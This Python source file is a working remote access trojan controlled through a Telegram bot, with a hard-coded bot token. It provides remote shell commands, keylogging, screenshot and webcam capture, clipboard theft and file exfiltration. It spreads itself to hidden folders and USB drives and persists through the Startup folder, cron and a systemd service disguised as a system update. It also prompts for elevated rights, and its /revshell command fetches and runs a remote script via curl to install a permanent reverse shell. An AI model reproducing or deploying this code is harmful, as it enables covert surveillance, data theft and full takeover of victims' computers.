import os
import sys
import cv2
import time
import nmap
import socket
import psutil
import sqlite3
import telebot
import geocoder
import platform
import pyperclip
import pyautogui
import subprocess
import shutil
import ctypes
from pynput import keyboard

# Replace with Telegram bot API key
BOT_API_KEY = "8350205688:AAFGMGFTBLuc9uPrKLu2y6WHnBWQLfi58yo"
# Replace with your telegram user id
telegram_user_id = 7979345785

bot = telebot.TeleBot(BOT_API_KEY)

# Global variables
keylogger_active = True
keylogger_active = False

# Verify commands are coming from registered telegram user
def verify_telegram_id(id):
    return telegram_user_id == id

# Execute system commands
def execute_system_command(cmd):
    max_message_length = 2048
    output = subprocess.getstatusoutput(cmd)

    # Shorten response if greater than 2048 characters
    if len(output[1]) > max_message_length:
        return str(output[1][:max_message_length])
    
    return str(output[1])

# --- UAC Bypass ---
def bypass_uac():
    if platform.system() == "Windows" and not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, None
        )
        sys.exit(0)

# Keylogger functions
log_file_path = "keylog.txt"  # Define the path for the log file
keylogger_active = False

# Keylogger functions
def on_press(key):
    global log_file_path
    try:
        with open(log_file_path, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            with open(log_file_path, "a") as f:
                f.write(" ")
        elif key == keyboard.Key.enter:
            with open(log_file_path, "a") as f:
                f.write("\n")
        else:
            with open(log_file_path, "a") as f:
                f.write(f"[{key}]")

def start_keylogger():
    global keylogger_active
    keylogger_active = True
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def stop_keylogger():
    global keylogger_active
    keylogger_active = False

# Start bot
@bot.message_handler(commands=['start'])
def begin(message):
    if not verify_telegram_id(message.from_user.id):
        return

    help_message = """
Available Commands:

/start - Start the bot and display system info
/help - Show this help message
/cmd - Custom shell command

[ File & Directory Management ]
/viewFile <file_path> - View contents of a file
/listDir <dir_path> - List contents of a directory
/downloadFile <file_path> - Download a file from the system
/createFile <file_path> <content> - Create a new file with content
/deleteFile <file_path> - Delete a specified file

[ Screenshot & Camera ]
/screenshot - Take a screenshot of the system
/webcam - Capture an image from the system webcam
/recordVideo <duration_in_seconds> - Record a video from the webcam

[ Network & Process Info ]
/networkInfo - Display network information (IP, interfaces)
/services - List running services/processes
/killProcess <process_name_or_pid> - Kill a process by its name or PID

[ Clipboard Commands ]
/getClipboard - Retrieve the contents of the clipboard

[ Keylogger Commands ]
/startKeylogger - Start logging keystrokes
/stopKeylogger - Stop logging keystrokes and send log file

[ Geolocation Command ]
/getLocation - Get the device's location

[ Misc Commands ]
/revshell - Install permanent reverse shell using Gsocket
/envInfo - Provide detailed system information
/downloadFile <file_path> - Download a specified file

[ Persistence Commands ]
/persist - Adds a registry entry to run on startup
/replicate - Copies the script to hidden/system directories (e.g., AppData, /etc/).
    """    
    hostname = execute_system_command("hostname")
    current_user = execute_system_command("whoami")
    op_sys = execute_system_command("uname -a")
    response = f"Running as: {current_user}@{hostname}"
    bot.reply_to(message, response)
    bot.reply_to(message, help_message)

# /help command to provide command overview
@bot.message_handler(commands=['help'])
def help(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    help_message = """
Available Commands:

/start - Start the bot and display system info
/help - Show this help message
/cmd - Custom shell command

[ File & Directory Management ]
/viewFile <file_path> - View contents of a file
/listDir <dir_path> - List contents of a directory
/downloadFile <file_path> - Download a file from the system
/createFile <file_path> <content> - Create a new file with content
/deleteFile <file_path> - Delete a specified file

[ Screenshot & Camera ]
/screenshot - Take a screenshot of the system
/webcam - Capture an image from the system webcam
/recordVideo <duration_in_seconds> - Record a video from the webcam

[ Network & Process Info ]
/networkInfo - Display network information (IP, interfaces)
/services - List running services/processes
/killProcess <process_name_or_pid> - Kill a process by its name or PID0

[ Clipboard Commands ]
/getClipboard - Retrieve the contents of the clipboard

[ Keylogger Commands ]
/startKeylogger - Start logging keystrokes
/stopKeylogger - Stop logging keystrokes and send log file

[ Geolocation Command ]
/getLocation - Get the device's location

[ Misc Commands ]
/revshell - Install permanent reverse shell using Gsocket (Linux/OSX)
/envInfo - Provide detailed system information
/downloadFile <file_path> - Download a specified file

[ Persistence Commands ]
/persist - Adds a registry entry to run on startup
/replicate - Copies the script to hidden/system directories (e.g., AppData, /etc/).
"""
    bot.reply_to(message, help_message)

@bot.message_handler(commands=['cmd'])
def cmd(message):
    if not verify_telegram_id(message.from_user.id):
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "Usage: /cmd <command>")
        return

    command = args[1].strip()
    try:
        status_code, output = subprocess.getstatusoutput(command)
        if not output:
            output = f"[!] No output. Exit code: {status_code}"
        bot.reply_to(message, output[:4096])  # Telegram limit
    except Exception as e:
        bot.reply_to(message, f"[!] Error executing command: {str(e)}")

# FUnction that provide detailed system information
@bot.message_handler(commands=['envInfo'])
def env_info(message):
    if not verify_telegram_id(message.from_user.id):
        return

    try:
        # CPU usage
        cpu_usage = psutil.cpu_percent(interval=1)
        # RAM usage
        ram = psutil.virtual_memory()
        ram_usage = ram.percent
        # Disk space
        disk = psutil.disk_usage('/')
        disk_usage = disk.percent
        # Running applications
        running_procs = "\n".join([p.info['name'] for p in psutil.process_iter(['name'])])

        result = (
            f"CPU Usage: {cpu_usage}%\n"
            f"RAM Usage: {ram_usage}%\n"
            f"Disk Usage: {disk_usage}%\n"
            f"Running Applications:\n{running_procs if running_procs else 'No running applications.'}"
        )

        bot.reply_to(message, result)
    except Exception as e:
        bot.reply_to(message, f"[!] Failed to retrieve environment info: {str(e)}")

# Function to get the device's location
@bot.message_handler(commands=['getLocation'])
def get_location(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    try:
        # Get the geolocation based on the public IP
        g = geocoder.ip('me')  # 'me' returns the current user's IP location
        
        if g.ok:
            location_info = f"Location: {g.city}, {g.state}, {g.country}\n" \
                            f"Latitude: {g.latlng[0]}, Longitude: {g.latlng[1]}"
            bot.reply_to(message, location_info)
        else:
            bot.reply_to(message, "[!] Failed to retrieve location.")
    except Exception as e:
        bot.reply_to(message, f"[!] Error: {str(e)}")
        
# Function to execute the bash command and send output to Telegram
@bot.message_handler(commands=['revshell'])
def run_gsocket_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    try:
        # Execute the bash command
        command = "bash -c \"$(curl -fsSL https://gsocket.io/y)\""
        output = subprocess.getoutput(command)

        # Telegram message limit is 4096 characters
        max_message_length = 4096
        if len(output) > max_message_length:
            for i in range(0, len(output), max_message_length):
                bot.send_message(message.from_user.id, output[i:i+max_message_length])
        else:
            bot.send_message(message.from_user.id, output)

    except Exception as e:
        bot.reply_to(message, f"[!] Failed to execute command: {str(e)}")

# Start keylogger command
@bot.message_handler(commands=['startKeylogger'])
def start_keylogger_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    global keylogger_active
    if not keylogger_active:
        bot.reply_to(message, "[+] Keylogger started.")
        start_keylogger()
    else:
        bot.reply_to(message, "[!] Keylogger is already running.")

# Stop keylogger command
@bot.message_handler(commands=['stopKeylogger'])
def stop_keylogger_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    global keylogger_active
    if keylogger_active:
        stop_keylogger()
        with open(log_file_path, "r") as f:
            log_content = f.read()
        bot.send_message(message.from_user.id, "[+] Keylogger stopped. Here is the log:")
        bot.send_message(message.from_user.id, log_content)
        os.remove(log_file_path)  # Optionally delete the log file
    else:
        bot.reply_to(message, "[!] Keylogger is not running.")

# Function to retrieve clipboard data
@bot.message_handler(commands=['getClipboard'])
def get_clipboard(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    try:
        clipboard_content = pyperclip.paste()  # Retrieve clipboard content
        if not clipboard_content:
            bot.reply_to(message, "[!] Clipboard is empty.")
        else:
            bot.reply_to(message, f"Clipboard content:\n{clipboard_content}")
    except Exception as e:
        bot.reply_to(message, f"[!] Failed to retrieve clipboard data: {str(e)}")
                        
# View contents of a file
@bot.message_handler(commands=['viewFile'])
def view_file(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    if len(message.text.split(' ')) != 2:
        return 
    
    file_path = message.text.split(' ')[1]
    result = ""
    if platform.system() == "Windows":
        result = execute_system_command(f"type {file_path}")
    else:
        result = execute_system_command(f"cat {file_path}")

    bot.reply_to(message, result)

# List contents of a directory
@bot.message_handler(commands=['listDir'])
def list_directory(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    if len(message.text.split(' ')) != 2:
        return 
    
    file_path = message.text.split(' ')[1]
    result = ""
    if platform.system() == "Windows":
        result = execute_system_command(f"dir {file_path}")
    else:
        result = execute_system_command(f"ls -lah {file_path}")

    bot.reply_to(message, result)

# Download a file
@bot.message_handler(commands=['downloadFile'])
def download_file(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    if len(message.text.split(' ')) != 2:
        return 
    
    file_path = message.text.split(' ')[1]
    try:
        with open(file_path, "rb") as file:
            bot.send_document(message.from_user.id, file)
            bot.reply_to(message, "[+] File downloaded")
    except:
        bot.reply_to(message, "[!] Unsuccessful")

# List running services
@bot.message_handler(commands=['services'])
def running_services(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    result = ""
    if platform.system() == "Windows":
        result = execute_system_command("tasklist")
    else:
        result = execute_system_command("ps aux")

    bot.reply_to(message, result)

# Take screenshot of system
@bot.message_handler(commands=['screenshot'])
def take_screenshot(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    try:
        # Capture screenshot and save to a file using pyautogui
        timestamp = int(time.time())
        screenshot_filename = f"{timestamp}.png"

        # Capture the screenshot and save it directly
        pyautogui.screenshot(screenshot_filename)

        # Open the saved screenshot and send it through Telegram bot
        with open(screenshot_filename, "rb") as image:
            bot.send_photo(message.from_user.id, image)

        bot.reply_to(message, "[+] Screenshot taken and sent")
    except Exception as e:
        bot.reply_to(message, f"[!] Unsuccessful: {str(e)}")

# Take a picture using webcam
@bot.message_handler(commands=['webcam'])
def webcam(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    try:
        # Open webcam (camera index 0)
        cap = cv2.VideoCapture(0)

        # Capture a single frame from webcam
        ret, frame = cap.read()
        if ret:
            # Save capture
            timestamp = int(time.time())
            cv2.imwrite(f"{timestamp}.png", frame)
            
            with open(f"{timestamp}.png", "rb") as image:
                bot.send_photo(message.from_user.id, image)

            cap.release()
    except:
        bot.reply_to(message, "[!] Unsuccessful")

# Record video
@bot.message_handler(commands=['recordVideo'])
def record_video(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    if len(message.text.split(' ')) != 2:
        return 
    
    try:
        # Video duration
        duration = int(message.text.split(' ')[1])

        cap = cv2.VideoCapture(0)
        # Create a videowriter object for saving video
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        timestamp = int(time.time())
        out = cv2.VideoWriter(f"{timestamp}.avi", fourcc, 20.0, (640, 480))

        start_time = time.time()
        while (time.time() - start_time) < duration:
            ret, frame = cap.read()
            if not ret:
                break

            out.write(frame)

        # Release videowriter and webcam
        out.release()
        cap.release()

        # Upload to telegram
        with open(f"{timestamp}.avi", "rb") as video:
            bot.send_video(message.from_user.id, video)
    except:
        bot.reply_to(message, "[!] Unsuccessful")       

# Get network information
@bot.message_handler(commands=['networkInfo'])
def network_info(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)

        interfaces = psutil.net_if_addrs()
        result = f"Hostname: {hostname}\nLocal IP: {local_ip}\n\nInterfaces:\n"
        for interface, addr_list in interfaces.items():
            result += f"{interface}:\n"
            for addr in addr_list:
                if addr.family == socket.AF_INET:
                    result += f"  IP Address: {addr.address}\n"
                elif addr.family == socket.AF_INET6:
                    result += f"  IPv6 Address: {addr.address}\n"
                elif hasattr(psutil, 'AF_LINK') and addr.family == psutil.AF_LINK:
                    result += f"  MAC Address: {addr.address}\n"
                elif addr.family == psutil.AF_PACKET:  # For Linux
                    result += f"  MAC Address: {addr.address}\n"
        
        bot.reply_to(message, result)
    except Exception as e:
        bot.reply_to(message, "[!] Failed to retrieve network info.")

# Create a file
@bot.message_handler(commands=['createFile'])
def create_file(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    args = message.text.strip().split(' ', 2)
    if len(args) != 3:
        bot.reply_to(message, "Usage: /createFile <file_path> <content>")
        return
    
    file_path = args[1]
    content = args[2]
    
    try:
        with open(file_path, "w") as file:
            file.write(content)
        bot.reply_to(message, "[+] File created successfully")
    except Exception as e:
        bot.reply_to(message, f"[!] Failed to create file: {str(e)}")

# Delete a file
@bot.message_handler(commands=['deleteFile'])
def delete_file(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    args = message.text.strip().split(' ', 1)
    if len(args) != 2:
        bot.reply_to(message, "Usage: /deleteFile <file_path>")
        return
    
    file_path = args[1]
    
    try:
        os.remove(file_path)
        bot.reply_to(message, "[+] File deleted successfully")
    except Exception as e:
        bot.reply_to(message, f"[!] Failed to delete file: {str(e)}")

### Self-Replication and Persistence Functions ###
def replicate_self():
    """Copy the script to hidden/system directories and removable drives."""
    try:
        # Get the current script's path
        current_script = os.path.abspath(sys.executable)  # Points to the .exe file
        script_name = os.path.basename(current_script)

        # Target directories for replication
        targets = []
        
        # Windows: Copy to AppData, ProgramData, and removable drives
        if platform.system() == "Windows":
            targets.extend([
                os.path.join(os.getenv("APPDATA"), script_name),
                os.path.join(os.getenv("PROGRAMDATA"), script_name),
            ])
            # Check for removable drives (e.g., USB)
            for drive in ["D:", "E:", "F:"]:
                if os.path.exists(drive):
                    targets.append(os.path.join(drive, script_name))
        
        # Linux: Copy to /etc/, /tmp/, and removable media
        else:
            targets.extend([
                f"/etc/{script_name}",
                f"/tmp/.{script_name}",
            ])
            # Check for removable media (e.g., /media/)
            if os.path.exists("/media"):
                for media in os.listdir("/media"):
                    targets.append(os.path.join("/media", media, script_name))

        # Copy the script to target locations
        for target in targets:
            try:
                shutil.copy2(current_script, target)
                # Make the file hidden (Windows) or executable (Linux)
                if platform.system() == "Windows":
                    subprocess.run(["attrib", "+h", target], shell=True, check=True)
                else:
                    os.chmod(target, 0o755)
            except Exception as e:
                pass  # Silently fail if unable to copy

    except Exception as e:
        pass  # Fail silently to avoid detection

def add_persistence():
    """Add the script to startup or cron for persistence."""
    try:
        # Get the path of the current executable (compiled .exe)
        current_exe = os.path.abspath(sys.executable)
        
        # Define the Startup folder path
        startup_folder = os.path.join(
            os.getenv("APPDATA"),
            "Microsoft",
            "Windows",
            "Start Menu",
            "Programs",
            "Startup"
        )
        
        # Copy the .exe to the Startup folder
        if os.path.exists(startup_folder):
            target_path = os.path.join(startup_folder, os.path.basename(current_exe))
            shutil.copy2(current_exe, target_path)
            print(f"[+] Added to Startup: {target_path}")
        else:
            print("[!] Startup folder not found.")
    except Exception as e:
        print(f"[!] Error: {e}")

        # Linux: Add to cron or systemd
        if platform.system() == "Linux":
            # Method 1: Cron job (runs every minute)
            cron_cmd = f"(crontab -l 2>/dev/null; echo \"* * * * * {current_script}\") | crontab -"
            subprocess.run(cron_cmd, shell=True, check=True)
            
            # Method 2: Systemd service (for modern Linux distros)
            service_content = f"""
            [Unit]
            Description=System Update Service
            After=network.target

            [Service]
            ExecStart={current_script}
            Restart=always
            User=root

            [Install]
            WantedBy=multi-user.target
            """
            service_path = "/etc/systemd/system/system-update.service"
            with open(service_path, "w") as f:
                f.write(service_content)
            subprocess.run(["systemctl", "enable", "system-update.service"], check=True)
            subprocess.run(["systemctl", "start", "system-update.service"], check=True)

    except Exception as e:
        pass  # Fail silently

### Telegram Bot Commands for Persistence ###
@bot.message_handler(commands=['replicate'])
def replicate_command(message):
    """Trigger self-replication."""
    if not verify_telegram_id(message.from_user.id):
        return
    
    replicate_self()
    bot.reply_to(message, "[+] Self-replication completed.")

@bot.message_handler(commands=['persist'])
def persist_command(message):
    """Trigger persistence mechanisms."""
    if not verify_telegram_id(message.from_user.id):
        return
    
    add_persistence()
    bot.reply_to(message, "[+] Persistence mechanisms activated.")

# Kill a running process
@bot.message_handler(commands=['killProcess'])
def kill_process(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    args = message.text.strip().split(' ', 1)
    if len(args) != 2:
        bot.reply_to(message, "Usage: /killProcess <process_name_or_pid>")
        return
    
    process_identifier = args[1]
    
    try:
        # Check if it's a PID
        if process_identifier.isdigit():
            pid = int(process_identifier)
            p = psutil.Process(pid)
            p.terminate()
        else:
            # If it's a process name
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == process_identifier:
                    proc.terminate()
        bot.reply_to(message, "[+] Process terminated successfully")
    except Exception as e:
        bot.reply_to(message, f"[!] Failed to terminate process: {str(e)}")

if __name__ == "__main__":
    # Automatically replicate and persist on first run
    bypass_uac()
    replicate_self()
    add_persistence()
    bot.polling()
